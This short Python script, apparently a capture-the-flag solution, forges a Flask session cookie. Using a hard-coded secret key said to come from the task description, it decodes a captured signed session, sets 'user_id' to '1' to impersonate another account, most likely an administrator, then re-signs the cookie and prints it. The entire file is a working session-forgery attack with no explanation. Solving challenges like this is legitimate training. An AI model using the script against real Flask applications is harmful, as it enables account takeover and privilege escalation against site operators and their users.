import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer,session_json_serializer
from sys import argv

KEY = '06f4eefabf03b8f4e521fbdada13f65c'  # from the task description


def decode_flask_cookie(secret_key, cookie_str):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer() #session_json_serializer
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    #print(s)
    return s.loads(cookie_str)


def encode_flask_cookie(secret_key, cookie):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    #print(hashlib.sha1)
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    return s.dumps(cookie)


if __name__ == '__main__':
    cookie = '.eJwlj0FqQzEMRO_idRaSLNlWLvORLYmGQAv_J6vSu8fQ5TDvwcxvOfKM66vcX-c7buV4eLkXo8rTY4USZ0tHcvKFXqGzS1JtpmJQh6CqAW9EqyN3m9AYnXI6aQusJLIrTiD1adpJNaChyQLxndswDXZOW5FK1Wl1bOVW1nXm8fp5xvfeg9o3111McoylMYA6V3fuHXUATkGoztt7X3H-n-Dy9wGNyD4U.DyXkkg.wneRu7_aX05I7rxvvW3WPgi0tJw'
    cookie_val = (decode_flask_cookie(KEY, cookie))
    new_cookie = dict(cookie_val)
    new_cookie['user_id'] = '1'
    answer=encode_flask_cookie(KEY, new_cookie)
    print(answer)